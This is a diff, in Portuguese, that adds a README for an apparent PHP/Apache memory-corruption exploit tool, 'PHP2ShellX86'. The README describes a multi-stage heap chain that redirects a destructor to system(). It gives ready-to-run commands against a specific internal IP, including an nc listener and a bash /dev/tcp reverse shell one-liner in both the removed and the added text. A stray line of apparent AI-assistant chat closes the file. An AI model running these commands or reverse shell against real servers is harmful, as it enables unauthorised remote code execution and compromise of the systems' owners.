@@ -1,17 +1,104 @@
-Terminal 1 — abra o listener:
+# PHP2ShellX86
 
+PoC / exploit chain para uma falha em runtime PHP em um ambiente específico do Apache/PHP (`php:8.4.26-apache`) com configuração `prefork` e `display_errors=Off`.
+
+Este projeto não é um "web shell" genérico; é uma demonstração de exploração em nível de memória em Python para alcançar execução remota de comandos em um alvo controlado. O objetivo principal é mostrar a cadeia de exploração em um laboratório autorizado, com foco em heap corruption / dangling pointer / fake reference em PHP.
+
+Aviso importante: use apenas em ambientes de laboratório ou com autorização explícita. Este código pode ser usado para invasão de sistemas reais e é potencialmente perigoso.
+
+## O que o exploit faz
+
+O script `php2x86.py` monta uma cadeia HTTP em várias etapas:
+
+- `A1`: `END-cleanup send_cookie OOM`
+- `B1`: leitura fora dos limites (`stale-id OOB read`) para obter base do chunk e da biblioteca `libphp`
+- `A2`: `cheap OOM` para criar `PS(http_session_vars)` dangling
+- `B2`: `fake reference` + `fake zend_array` para redirecionar o destructor para `zif_system`
+
+Em outras palavras, a ferramenta tenta explorar uma falha em memória para escrever uma ponteiro para `system()` em um local que o PHP vai invocar durante a manipulação de arrays/objetos em um request legítimo. O resultado esperado é execução de comando no alvo.
+
+A implementação usa uma sequência de payloads HTTP e auxiliares de geração de chunks para explorar o comportamento do worker do PHP em um prefork Apache.
+
+## Requisitos
+
+- Python 3
+- acesso ao host alvo em rede
+- alvo com PHP/Apache compatível com a cadeia de exploração
+- perfil de arquitetura compatível (`x86_64` ou `aarch64`)
+- opção `--workers` ajustada conforme a configuração do servidor alvo
+
+## Estrutura
+
+- `php2x86.py` — entry point principal
+- `readme` — documentação deste repositório
+
+## Uso rápido
+
+Antes de executar, tenha o listener pronto em outra sessão:
+
+```bash
 nc -lvnp 4444
+```
 
-Terminal 2 — execute o exploit:
+Exemplo de execução direta:
 
-cd /home/kali/codex/PHP2SHELL-172.16.14.179
-
-PHP2SHELL_HOST=172.16.14.179 python3 exploits/php2shell_remote.py \
+```bash
+PHP2SHELL_HOST=172.16.14.179 python3 php2x86.py \
   --port 80 \
   --arch x86_64 \
   --workers 150 \
-  --retries 1 \
+  --retries 3 \
   --timeout 180 \
-  --cmd 'bash -c "bash -i >& /dev/tcp/seuipvpn/4444 0>&1"' \
-  --outdir loot \
-  --proof loot/proof.txt
+  --cmd 'id > /out/p1' \
+  --outdir out \
+  --proof out/p1
+```
+
+Exemplo com reverse shell:
+
+```bash
+PHP2SHELL_HOST=172.16.14.179 python3 php2x86.py \
+  --port 80 \
+  --arch x86_64 \
+  --workers 150 \
+  --timeout 180 \
+  --cmd 'bash -c "bash -i >& /dev/tcp/SEU_IP/4444 0>&1"' \
+  --outdir out \
+  --proof out/proof.txt
+```
+
+## Opções mais importantes
+
+- `--port` — porta HTTP do alvo
+- `--arch` — arquitetura: `auto`, `x86_64`, `aarch64`
+- `--workers` — quantidade de workers do servidor Apache / prefork
+- `--retries` — quantas tentativas da cadeia serão feitas
+- `--timeout` — timeout para as requisições HTTP
+- `--cmd` — comando a executar no alvo
+- `--proof` — arquivo usado para confirmar que a execução foi bem-sucedida
+- `--restart` — nome do container Docker para reiniciar antes da exploração
+
+## Observações técnicas
+
+A implementação usa `subprocess` para gerar payloads intermediários, envia requisições HTTP chunked, e tenta explotar padrões de heap e ponteiros em memória do PHP. O código foi escrito para um cenário específico, e a eficácia depende fortemente do alvo e da configuração do servidor.
+
+Em resumo, o script é mais adequado para:
+
+- CTFs
+- laboratórios de segurança
+- testes autorizados em ambientes isolados
+- estudo de exploração de memória em PHP
+
+## Segurança e ética
+
+Este repositório deve ser usado somente com autorização explícita do dono do sistema alvo. A exposição de uma falha crítica em `php` pode causar comprometimento real do serviço, perda de dados e risco operacional.
+
+Se o seu objetivo for aprender sobre segurança, prefira laboratórios isolados, VMs e ambientes de testes controlados.
+
+## Resumo
+
+Este código é uma PoC de exploração em PHP/Apache, voltada para um alvo muito específico e com requisitos bem definidos. O valor real do projeto está em estudar a cadeia de exploração, analisar o comportamento do heap e entender como falhas de memória podem levar a execução remota de código.
+
+---
+
+Se quiser, também posso transformar este arquivo em uma versão em inglês, em português, ou criar um `README.md` oficial com apresentação mais profissional e visualmente melhor.
